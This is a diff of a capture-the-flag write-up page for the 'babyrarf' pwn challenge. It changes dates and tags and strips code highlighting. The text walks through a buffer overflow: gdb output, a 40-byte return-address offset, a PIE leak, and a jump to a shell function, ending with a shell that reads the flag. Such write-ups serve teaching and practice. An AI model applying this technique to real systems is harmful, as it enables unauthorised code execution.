@@ -24,8 +24,8 @@ Let&rsquo;s take a look at the src!
 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt; typedef struct attack { uint64_t id; uint64_t dmg; } attack; typedef struct character { char name[10]; int health; } character; uint8_t score; int read_int(){ char buf[10]; fgets(buf, 10, stdin); return atoi(buf); } void get_shell(){ execve(&#34;/bin/sh&#34;, NULL, NULL); } attack choose_attack(){ attack a; int id; puts(&#34;Choose an attack:\n&#34;); puts(&#34;1." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://ret2school.github.io/post/babyrarf/" />
-<meta property="article:published_time" content="2020-12-01T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-12-01T00:00:00+00:00" />
+<meta property="article:published_time" content="2021-02-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-02-21T00:00:00+00:00" />
 
 
   </head>
@@ -65,7 +65,7 @@ Let&rsquo;s take a look at the src!
   <title>calendar</title>
   <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
 </svg>
-          Dec 1, 2020
+          Feb 21, 2021
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
@@ -81,6 +81,7 @@ Let&rsquo;s take a look at the src!
 </svg>
               <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
               <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
         </div>
       </div>
     </header>
@@ -196,66 +197,66 @@ attack <span style="color:#a6e22e">choose_attack</span>(){
 }
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> stack <span style="color:#960050;background-color:#1e0010">────</span>
-<span style="color:#ae81ff">0x00007fffffffdf48</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000</span>: <span style="color:#ae81ff">0x00007ffff7dd30b3</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>__libc_start_main<span style="color:#f92672">+</span><span style="color:#ae81ff">243</span><span style="color:#f92672">&gt;</span> mov edi, eax	 <span style="color:#960050;background-color:#1e0010">←</span> <span style="color:#960050;background-color:#1e0010">$</span>rsp
-<span style="color:#ae81ff">0x00007fffffffdf50</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0008</span>: <span style="color:#ae81ff">0x00007ffff7ffc620</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#ae81ff">0x0005081200000000</span>
-<span style="color:#ae81ff">0x00007fffffffdf58</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0010</span>: <span style="color:#ae81ff">0x00007fffffffe038</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#ae81ff">0x00007fffffffe357</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#e6db74">&#34;/home/nasm/dist/babyrarf&#34;</span>
-<span style="color:#ae81ff">0x00007fffffffdf60</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0018</span>: <span style="color:#ae81ff">0x0000000100000000</span>
-<span style="color:#ae81ff">0x00007fffffffdf68</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0020</span>: <span style="color:#ae81ff">0x00005555555552e4</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> push rbp
-<span style="color:#ae81ff">0x00007fffffffdf70</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0028</span>: <span style="color:#ae81ff">0x00005555555554d0</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> endbr64 
-<span style="color:#ae81ff">0x00007fffffffdf78</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0030</span>: <span style="color:#ae81ff">0xdb21ca7fd193f05a</span>
-<span style="color:#ae81ff">0x00007fffffffdf80</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0038</span>: <span style="color:#ae81ff">0x00005555555550b0</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>_start<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> endbr64 
-<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> code:x86:<span style="color:#ae81ff">64</span> <span style="color:#960050;background-color:#1e0010">────</span>
-   <span style="color:#ae81ff">0x5555555552de</span> <span style="color:#f92672">&lt;</span>choose_attack<span style="color:#f92672">+</span><span style="color:#ae81ff">234</span><span style="color:#f92672">&gt;</span> mov    rdx, QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span>]
-   <span style="color:#ae81ff">0x5555555552e2</span> <span style="color:#f92672">&lt;</span>choose_attack<span style="color:#f92672">+</span><span style="color:#ae81ff">238</span><span style="color:#f92672">&gt;</span> leave  
-   <span style="color:#ae81ff">0x5555555552e3</span> <span style="color:#f92672">&lt;</span>choose_attack<span style="color:#f92672">+</span><span style="color:#ae81ff">239</span><span style="color:#f92672">&gt;</span> ret    
- <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#ae81ff">0x5555555552e4</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>         push   rbp
-   <span style="color:#ae81ff">0x5555555552e5</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>         mov    rbp, rsp
-   <span style="color:#ae81ff">0x5555555552e8</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>         sub    rsp, <span style="color:#ae81ff">0x40</span>
-   <span style="color:#ae81ff">0x5555555552ec</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>         mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>], <span style="color:#ae81ff">0x0</span>
-   <span style="color:#ae81ff">0x5555555552f4</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>        mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span>], <span style="color:#ae81ff">0x0</span>
-   <span style="color:#ae81ff">0x5555555552fc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>        mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x14</span>], <span style="color:#ae81ff">0x64</span>
-<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> threads <span style="color:#960050;background-color:#1e0010">────</span>
-[<span style="color:#75715e">#0] Id 1, Name: &#34;babyrarf&#34;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT</span>
-<span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> trace <span style="color:#960050;background-color:#1e0010">────</span>
-[<span style="color:#75715e">#0] 0x5555555552e4 → main()</span>
-<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
-gef<span style="color:#960050;background-color:#1e0010">➤</span>  
-</code></pre></div><p>And at the call to fgets:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#ae81ff">0x55555555537d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>       lea    rax, [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
-   <span style="color:#ae81ff">0x555555555381</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">157</span><span style="color:#f92672">&gt;</span>       mov    esi, <span style="color:#ae81ff">0xa</span>
-   <span style="color:#ae81ff">0x555555555386</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">162</span><span style="color:#f92672">&gt;</span>       mov    rdi, rax
- <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#ae81ff">0x555555555389</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">165</span><span style="color:#f92672">&gt;</span>       call   <span style="color:#ae81ff">0x555555555060</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-   <span style="color:#960050;background-color:#1e0010">↳</span>  <span style="color:#ae81ff">0x555555555060</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>    jmp    QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2fca</span>]        <span style="color:#75715e"># 0x555555558030 &lt;fgets@got.plt&gt;</span>
-      <span style="color:#ae81ff">0x555555555066</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">0x3</span>
-      <span style="color:#ae81ff">0x55555555506b</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>   jmp    <span style="color:#ae81ff">0x555555555020</span>
-      <span style="color:#ae81ff">0x555555555070</span> <span style="color:#f92672">&lt;</span>execve<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>   jmp    QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2fc2</span>]        <span style="color:#75715e"># 0x555555558038 &lt;execve@got.plt&gt;</span>
-      <span style="color:#ae81ff">0x555555555076</span> <span style="color:#f92672">&lt;</span>execve<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;</span>   push   <span style="color:#ae81ff">0x4</span>
-      <span style="color:#ae81ff">0x55555555507b</span> <span style="color:#f92672">&lt;</span>execve<span style="color:#a6e22e">@plt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>  jmp    <span style="color:#ae81ff">0x555555555020</span>
-<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> arguments (guessed) <span style="color:#960050;background-color:#1e0010">────</span>
-fgets<span style="color:#a6e22e">@plt</span> (
-   <span style="color:#960050;background-color:#1e0010">$</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007fffffffdf20</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#ae81ff">0x0000000000000000</span>,
-   <span style="color:#960050;background-color:#1e0010">$</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000000000a</span>,
-   <span style="color:#960050;background-color:#1e0010">$</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffff7f97980</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#ae81ff">0x00000000fbad208b</span>
+<pre><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← $rsp
+0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
+0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  &quot;/home/nasm/dist/babyrarf&quot;
+0x00007fffffffdf60│+0x0018: 0x0000000100000000
+0x00007fffffffdf68│+0x0020: 0x00005555555552e4  →  &lt;main+0&gt; push rbp
+0x00007fffffffdf70│+0x0028: 0x00005555555554d0  →  &lt;__libc_csu_init+0&gt; endbr64 
+0x00007fffffffdf78│+0x0030: 0xdb21ca7fd193f05a
+0x00007fffffffdf80│+0x0038: 0x00005555555550b0  →  &lt;_start+0&gt; endbr64 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555552de &lt;choose_attack+234&gt; mov    rdx, QWORD PTR [rbp-0x18]
+   0x5555555552e2 &lt;choose_attack+238&gt; leave  
+   0x5555555552e3 &lt;choose_attack+239&gt; ret    
+ → 0x5555555552e4 &lt;main+0&gt;         push   rbp
+   0x5555555552e5 &lt;main+1&gt;         mov    rbp, rsp
+   0x5555555552e8 &lt;main+4&gt;         sub    rsp, 0x40
+   0x5555555552ec &lt;main+8&gt;         mov    QWORD PTR [rbp-0x20], 0x0
+   0x5555555552f4 &lt;main+16&gt;        mov    QWORD PTR [rbp-0x18], 0x0
+   0x5555555552fc &lt;main+24&gt;        mov    DWORD PTR [rbp-0x14], 0x64
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5555555552e4 → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+</code></pre><p>And at the call to fgets:</p>
+<pre><code>   0x55555555537d &lt;main+153&gt;       lea    rax, [rbp-0x20]
+   0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
+   0x555555555386 &lt;main+162&gt;       mov    rdi, rax
+ → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
+   ↳  0x555555555060 &lt;fgets@plt+0&gt;    jmp    QWORD PTR [rip+0x2fca]        # 0x555555558030 &lt;fgets@got.plt&gt;
+      0x555555555066 &lt;fgets@plt+6&gt;    push   0x3
+      0x55555555506b &lt;fgets@plt+11&gt;   jmp    0x555555555020
+      0x555555555070 &lt;execve@plt+0&gt;   jmp    QWORD PTR [rip+0x2fc2]        # 0x555555558038 &lt;execve@got.plt&gt;
+      0x555555555076 &lt;execve@plt+6&gt;   push   0x4
+      0x55555555507b &lt;execve@plt+11&gt;  jmp    0x555555555020
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+fgets@plt (
+   $rdi = 0x00007fffffffdf20 → 0x0000000000000000,
+   $rsi = 0x000000000000000a,
+   $rdx = 0x00007ffff7f97980 → 0x00000000fbad208b
 )
-<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> threads <span style="color:#960050;background-color:#1e0010">────</span>
-[<span style="color:#75715e">#0] Id 1, Name: &#34;babyrarf&#34;, stopped 0x555555555389 in main (), reason: SINGLE STEP</span>
-<span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> trace <span style="color:#960050;background-color:#1e0010">────</span>
-[<span style="color:#75715e">#0] 0x555555555389 → main()</span>
-<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
-gef<span style="color:#960050;background-color:#1e0010">➤</span>  
-</code></pre></div><p>So main_ret_addr minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x555555555389 in main (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x555555555389 → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+</code></pre><p>So main_ret_addr minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
 So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
 We can so overwrite only the return address.</p>
 <p>Now we can take a look at the permissions:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">gef<span style="color:#960050;background-color:#1e0010">➤</span>  checksec
-[<span style="color:#f92672">+</span>] checksec <span style="color:#66d9ef">for</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>nasm<span style="color:#f92672">/</span>dist<span style="color:#f92672">/</span>babyrarf<span style="color:#960050;background-color:#1e0010">&#39;</span>
-Canary                        : <span style="color:#960050;background-color:#1e0010">✘</span> 
-NX                            : <span style="color:#960050;background-color:#1e0010">✓</span> 
-PIE                           : <span style="color:#960050;background-color:#1e0010">✓</span> 
-Fortify                       : <span style="color:#960050;background-color:#1e0010">✘</span> 
+<pre><code>gef➤  checksec
+[+] checksec for '/home/nasm/dist/babyrarf'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✘ 
 RelRO                         : Partial
-</code></pre></div><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
+</code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">attack <span style="color:#a6e22e">choose_attack</span>(){
     attack a;
@@ -341,34 +342,34 @@ r<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">You deal <span style="color:#ae81ff">40</span> dmg
-The boss deals <span style="color:#ae81ff">70</span> dmg
-You lost<span style="color:#960050;background-color:#1e0010">!</span>
+<pre><code>You deal 40 dmg
+The boss deals 70 dmg
+You lost!
 
 Choose an attack:
 
-<span style="color:#ae81ff">1.</span> Knife
+1. Knife
 
-<span style="color:#ae81ff">2.</span> A bigger knife
+2. A bigger knife
 
-<span style="color:#ae81ff">3.</span> Her Majesty<span style="color:#e6db74">&#39;s knife</span>
+3. Her Majesty's knife
 
-<span style="color:#ae81ff">4.</span> A cr0wn
-
-
-leak_csu<span style="color:#f92672">=</span><span style="color:#ae81ff">0x55b3b5b3a4d0</span>
-base: <span style="color:#ae81ff">0x55b3b5b39000</span>
-You deal <span style="color:#ae81ff">140736258161760</span> dmg
-The boss deals <span style="color:#ae81ff">96</span> dmg
-You lost<span style="color:#960050;background-color:#1e0010">!</span>
-
-Congratulations<span style="color:#960050;background-color:#1e0010">!</span> You may now declare yourself the winner:
+4. A cr0wn
 
 
-[<span style="color:#f92672">*</span>] Switching to interactive mode
-<span style="color:#960050;background-color:#1e0010">$</span> cat <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>babyrarf<span style="color:#f92672">/</span>flag<span style="color:#f92672">.</span>txt
+leak_csu=0x55b3b5b3a4d0
+base: 0x55b3b5b39000
+You deal 140736258161760 dmg
+The boss deals 96 dmg
+You lost!
+
+Congratulations! You may now declare yourself the winner:
+
+
+[*] Switching to interactive mode
+$ cat /home/babyrarf/flag.txt
 union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
-</code></pre></div><p>That&rsquo;s all folks :)</p>
+</code></pre><p>That&rsquo;s all folks :)</p>
 
     </div>
     <div class="post-footer">
